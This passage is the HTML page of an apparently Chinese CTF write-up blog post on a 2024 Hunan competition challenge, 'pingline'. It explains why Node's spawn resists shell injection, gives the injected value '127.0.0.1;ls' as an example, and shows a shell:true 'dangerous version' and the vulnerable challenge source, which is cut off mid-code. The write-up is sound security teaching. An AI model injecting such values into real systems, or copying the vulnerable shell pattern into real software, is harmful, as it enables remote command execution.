@@ -1,0 +1,886 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    2024年湖南省网络攻防赛道赛题复现 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="[TOC]  [入口靶机]pingline 考点:spawn 命令的Prototype Pollution to RCE 分析  前置知识 新版JS Prototype Pollution to RCE学习解析-先知社区  spawn 的工作方式 1const proc &#x3D; spawn(&quot;ping&quot;, [&#96;-c$&#123;count&#125;&#96;, body.ip!, &amp;qu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024年湖南省网络攻防赛道赛题复现">
+<meta property="og:url" content="http://example.com/2025/09/21/2024%E5%B9%B4%E6%B9%96%E5%8D%97%E7%9C%81%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="[TOC]  [入口靶机]pingline 考点:spawn 命令的Prototype Pollution to RCE 分析  前置知识 新版JS Prototype Pollution to RCE学习解析-先知社区  spawn 的工作方式 1const proc &#x3D; spawn(&quot;ping&quot;, [&#96;-c$&#123;count&#125;&#96;, body.ip!, &amp;qu">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/09/21/images/3841983962.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250921195541422.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250921200238740.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/1574497668.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/3841983962-17584572156577.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/2866340169.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250921202350092.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250921202604417.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/1186353468.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/2864072119.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/2167887636.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/3196509241.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250921203137778.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250921204515919.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250921204521754.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250921204527038.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250922102200910.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250922102228454.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250922103904750.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250922104033130.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250922112407681.png">
+<meta property="og:image" content="http://example.com/2025/09/21/images/image-20250922113037204.png">
+<meta property="article:published_time" content="2025-09-21T10:35:25.000Z">
+<meta property="article:modified_time" content="2025-12-10T08:13:25.267Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta property="article:tag" content="js原型链污染(spawn)">
+<meta property="article:tag" content="jackson反序列化">
+<meta property="article:tag" content="OGNL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/09/21/images/3841983962.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="2024年湖南省网络攻防赛道赛题复现">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">2024年湖南省网络攻防赛道赛题复现</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E9%9D%B6%E6%9C%BApingline"><span class="toc-number">1.</span> <span class="toc-text"> [入口靶机]pingline</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text"> 题解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC1%E6%AD%A5%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 第1步：函数调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC2%E6%AD%A5json%E8%A7%A3%E6%9E%90-%E8%BF%9B%E5%85%A5%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%A3%E6%9E%90%E5%99%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 第2步：JSON解析 - 进入自定义解析器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#21-%E5%88%9D%E5%A7%8B%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> 2.1 初始检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#22-%E6%8F%90%E5%8F%96%E5%86%85%E9%83%A8%E5%86%85%E5%AE%B9"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> 2.2 提取内部内容</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#23-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D"><span class="toc-number">1.2.2.3.</span> <span class="toc-text"> 2.3 正则表达式匹配</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#24-%E5%80%BC%E5%A4%84%E7%90%86-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.2.4.</span> <span class="toc-text"> 2.4 值处理 - 字符串类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#25-%E8%BF%94%E5%9B%9E%E8%A7%A3%E6%9E%90%E7%BB%93%E6%9E%9C"><span class="toc-number">1.2.2.5.</span> <span class="toc-text"> 2.5 返回解析结果</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC3%E6%AD%A5%E5%87%86%E5%A4%87ping%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 第3步：准备ping命令参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC4%E6%AD%A5%E6%89%A7%E8%A1%8Cping%E5%91%BD%E4%BB%A4%E5%B9%B6%E6%94%B6%E9%9B%86%E8%BE%93%E5%87%BA"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 第4步：执行ping命令并收集输出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-shell%E4%B8%BAtrue"><span class="toc-number">1.3.</span> <span class="toc-text"> 法一  shell为true</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-shell%E4%B8%BAbash%E7%AD%89"><span class="toc-number">1.4.</span> <span class="toc-text"> 法二 shell为bash等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E6%B1%A1%E6%9F%93%E6%88%90%E5%8A%9F"><span class="toc-number">1.5.</span> <span class="toc-text"> 问题-为什么能污染成功</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BAezbypass"><span class="toc-number">2.</span> <span class="toc-text"> [内网靶机]ezbypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%BA%90%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text"> 读源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A31%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98%E5%A4%8D%E7%8E%B0%E5%A4%B1%E8%B4%A5"><span class="toc-number">2.2.</span> <span class="toc-text"> 题解1（环境问题复现失败）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A32%E5%A4%9A%E4%BD%99"><span class="toc-number">2.3.</span> <span class="toc-text"> 题解2（多余）</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-2024年湖南省网络攻防赛道赛题复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/09/21/2024%E5%B9%B4%E6%B9%96%E5%8D%97%E7%9C%81%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-09-21T10:35:25.000Z" itemprop="datePublished">2025-09-21</time>
+    <time style="display: none;" id="post-update-time">2025-12-10</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>[TOC]</p>
+<h2 id="入口靶机pingline"><a class="markdownIt-Anchor" href="#入口靶机pingline"></a> [入口靶机]pingline</h2>
+<p>考点:<strong>spawn 命令的Prototype Pollution to RCE</strong> 分析</p>
+<h3 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h3>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15219#toc-2">新版JS Prototype Pollution to RCE学习解析-先知社区</a></p>
+<p><img src="../images/3841983962.png" alt="img" /></p>
+<p><strong>spawn 的工作方式</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const proc = spawn(&quot;ping&quot;, [`-c$&#123;count&#125;`, body.ip!, &quot;-W1&quot;], &#123;...&#125;);</span><br></pre></td></tr></table></figure>
+<p>这里的 <code>spawn</code> 函数是 <strong>参数化执行</strong>，而不是 <strong>字符串拼接执行</strong>。这意味着：</p>
+<ul>
+<li><strong>第一个参数</strong>：要执行的命令 <code>&quot;ping&quot;</code></li>
+<li><strong>第二个参数</strong>：参数数组 <code>[&quot;-c4&quot;, &quot;127.0.0.1;ls&quot;, &quot;-W1&quot;]</code></li>
+</ul>
+<p>实际执行的命令：</p>
+<ol>
+<li><strong>JSON 解析后</strong>：<code>body.ip = &quot;127.0.0.1;ls&quot;</code></li>
+<li><strong>spawn 调用</strong>：<code>spawn(&quot;ping&quot;, [&quot;-c4&quot;, &quot;127.0.0.1;ls&quot;, &quot;-W1&quot;])</code></li>
+<li><strong>实际执行的命令</strong>：系统看到的是：
+<ul>
+<li>命令：<code>ping</code></li>
+<li>参数1：<code>-c4</code></li>
+<li>参数2：<code>127.0.0.1;ls</code> （作为一个整体字符串）</li>
+<li>参数3：<code>-W1</code></li>
+</ul>
+</li>
+</ol>
+<p><strong>绕过方法</strong></p>
+<p>在 Unix shell 中，分号 <code>;</code> 是命令分隔符，但<strong>前提是</strong>命令是通过 shell 执行的。</p>
+<p><code>spawn</code> 默认是<strong>不通过 shell</strong> 执行的，它直接调用可执行文件并传递参数数组。</p>
+<p>可以通过以下两种方式令spawn将其执行：</p>
+<ol>
+<li><strong>通过 shell 执行</strong>：使用 <code>&#123;shell: true&#125;</code> 选项</li>
+<li><strong>或者使用 exec</strong>：<code>exec</code> 函数默认通过 shell 执行</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 危险版本（如果这样写就可以注入）</span></span><br><span class="line"><span class="keyword">const</span> proc = <span class="title function_">spawn</span>(<span class="string">`ping -c<span class="subst">$&#123;count&#125;</span> <span class="subst">$&#123;body.ip&#125;</span> -W1`</span>, &#123;</span><br><span class="line">  <span class="attr">shell</span>: <span class="literal">true</span>, <span class="comment">// 启用shell执行</span></span><br><span class="line">  <span class="attr">stdio</span>: [<span class="string">&quot;inherit&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;pipe&quot;</span>]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<h3 id="题解"><a class="markdownIt-Anchor" href="#题解"></a> 题解</h3>
+<p><img src="../images/image-20250921195541422.png" alt="image-20250921195541422" /></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;use server&quot;</span>; <span class="comment">// 声明这是在服务端运行的模块（常见于 Next.js server actions / 服务端文件提示）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; spawn &#125; <span class="keyword">from</span> <span class="string">&quot;node:child_process&quot;</span>; <span class="comment">// 从 Node 的 child_process 模块导入 spawn，用于创建子进程并执行系统命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Reinventing the wheel and make it square</span></span><br><span class="line"><span class="comment"> * Because JSON.parse is not available in the server environment (really?)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">jsonParse</span>(<span class="params"> <span class="comment">// 自定义的“简易 JSON 解析器”函数，接受字符串 str，和可选的目标对象 ret（用于递归赋值）</span></span></span><br><span class="line"><span class="params">  str: string,</span></span><br><span class="line"><span class="params">  ret?: Record&lt;string, any&gt;</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Record</span>&lt;string, any&gt; &#123;</span><br><span class="line">  ret ??= &#123;&#125;; <span class="comment">// 如果 ret 未提供，则将其初始化为空对象（使用 ??= 操作符）</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(str.<span class="title function_">startsWith</span>(<span class="string">&quot;&#123;&quot;</span>) &amp;&amp; str.<span class="title function_">endsWith</span>(<span class="string">&quot;&#125;&quot;</span>))) &#123; <span class="comment">// 仅处理以 &#123; 开头且以 &#125; 结尾的字符串，否则返回当前 ret（即不做解析）</span></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> matches = str <span class="comment">// 提取对象内部（去掉首尾大括号），并用正则 matchAll 查找键值对</span></span><br><span class="line">    .<span class="title function_">slice</span>(<span class="number">1</span>, str.<span class="property">length</span> - <span class="number">1</span>) <span class="comment">// 去掉最外层的大括号，保留内部内容</span></span><br><span class="line">    .<span class="title function_">matchAll</span>( <span class="comment">// 使用 matchAll 得到所有匹配结果的迭代器</span></span><br><span class="line">      <span class="regexp">/(?:^|,)\s*&quot;(?&lt;key&gt;\w+)&quot;\s*:\s*(?&lt;value&gt;\d+|(?:true|false)|&quot;(?:\\.|[^&quot;])*&quot;|\&#123;.+?&#125;)/g</span></span><br><span class="line">      <span class="comment">// 正则说明：</span></span><br><span class="line">      <span class="comment">// (?:^|,)    ：键值对前面要么是字符串开始，要么是逗号分隔（非捕获组）</span></span><br><span class="line">      <span class="comment">// \s*&quot;(?&lt;key&gt;\w+)&quot;\s*:\s* ：匹配形如 &quot;key&quot;: 的键部分（key 使用命名捕获 group）</span></span><br><span class="line">      <span class="comment">// (?&lt;value&gt; ... ) ：命名捕获 value，支持四种形式：</span></span><br><span class="line">      <span class="comment">//   \d+                 -&gt; 整数数字（仅正整数）</span></span><br><span class="line">      <span class="comment">//   (?:true|false)      -&gt; 布尔字面量 true/false</span></span><br><span class="line">      <span class="comment">//   &quot;(?:\\.|[^&quot;])*&quot;     -&gt; 双引号包裹的字符串，允许转义字符（简单处理）</span></span><br><span class="line">      <span class="comment">//   \&#123;.+?&#125;              -&gt; 以大括号包裹的子对象（使用非贪婪 .+?，注意：这不是平衡大括号的解析）</span></span><br><span class="line">    );</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> match <span class="keyword">of</span> matches) &#123; <span class="comment">// 遍历所有正则匹配的键值对</span></span><br><span class="line">    <span class="keyword">const</span> &#123; key, value &#125; = match.<span class="property">groups</span>!; <span class="comment">// 从命名捕获组中取出 key 和 value（使用非空断言 groups!）</span></span><br><span class="line">    <span class="keyword">if</span> (value.<span class="title function_">startsWith</span>(<span class="string">&#x27;&quot;&#x27;</span>)) &#123; <span class="comment">// 如果 value 是以引号开头，说明是字符串</span></span><br><span class="line">      ret[key] = value</span><br><span class="line">        .<span class="title function_">slice</span>(<span class="number">1</span>, value.<span class="property">length</span> - <span class="number">1</span>) <span class="comment">// 去掉首尾引号</span></span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/\\(u([0-9a-fA-F]&#123;4&#125;)|.)/g</span>, <span class="function">(<span class="params">_, m: string, code: string</span>) =&gt;</span></span><br><span class="line">          <span class="comment">// 将字符串中的转义序列还原：匹配 \uXXXX 或者一般的转义字符</span></span><br><span class="line">          m === <span class="string">&quot;u&quot;</span></span><br><span class="line">            ? <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="built_in">parseInt</span>(code, <span class="number">16</span>)) <span class="comment">// \uXXXX -&gt; 对应的 Unicode 字符</span></span><br><span class="line">            : (&#123; <span class="attr">b</span>: <span class="string">&quot;\b&quot;</span>, <span class="attr">f</span>: <span class="string">&quot;\f&quot;</span>, <span class="attr">n</span>: <span class="string">&quot;\n&quot;</span>, <span class="attr">r</span>: <span class="string">&quot;\r&quot;</span>, <span class="attr">t</span>: <span class="string">&quot;\t&quot;</span> &#125;[m] ?? m)</span><br><span class="line">          <span class="comment">// 其它常见转义字符映射：\b,\f,\n,\r,\t；否则返回原字符 m</span></span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value.<span class="title function_">startsWith</span>(<span class="string">&quot;&#123;&quot;</span>)) &#123; <span class="comment">// 如果 value 以 &#123; 开头，认为是一个子对象</span></span><br><span class="line">      <span class="keyword">if</span> (!(key <span class="keyword">in</span> ret)) ret[key] = &#123;&#125;; <span class="comment">// 如果 ret 中不存在该 key，则先创建空对象</span></span><br><span class="line">      <span class="title function_">jsonParse</span>(value, ret[key]); <span class="comment">// 递归解析子对象字符串，并把解析结果写入 ret[key]</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 否则是数字或布尔</span></span><br><span class="line">      ret[key] = &#123; <span class="attr">true</span>: <span class="literal">true</span>, <span class="attr">false</span>: <span class="literal">false</span> &#125;[value] ?? +value;</span><br><span class="line">      <span class="comment">// 若 value 是 &#x27;true&#x27; 或 &#x27;false&#x27;，映射为布尔值；否则尝试用一元 + 转为数字</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret; <span class="comment">// 返回解析好的对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">pingAction</span>(<span class="params">data: string, count: number = <span class="number">4</span></span>) &#123; <span class="comment">// 导出一个异步函数 pingAction，接收 data（期待是 json 字符串）和可选的 count（默认 4 次）</span></span><br><span class="line">  <span class="keyword">const</span> <span class="attr">body</span>: &#123; ip?: string &#125; = <span class="title function_">jsonParse</span>(data); <span class="comment">// 使用自定义 jsonParse 将 data 解析为对象，并断言 body 可能包含 ip 字段</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> proc = <span class="title function_">spawn</span>(<span class="string">&quot;ping&quot;</span>, [<span class="string">`-c<span class="subst">$&#123;count&#125;</span>`</span>, body.<span class="property">ip</span>!, <span class="string">&quot;-W1&quot;</span>], &#123; <span class="comment">// 